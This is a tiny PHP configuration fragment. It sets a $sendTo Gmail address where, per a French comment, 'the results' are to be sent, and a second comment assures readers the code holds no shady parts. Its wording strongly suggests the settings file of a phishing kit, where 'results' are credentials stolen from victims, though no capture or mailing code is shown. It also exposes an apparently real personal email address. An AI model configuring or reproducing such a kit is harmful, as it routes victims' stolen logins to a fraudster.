<?php 

	$sendTo = "allofifa09@gmail.com"; // email où sera envoyer les results


// Aucun code bizz dedans fouillez code comme vous voulez et mb pour la qualité / propreté du code
 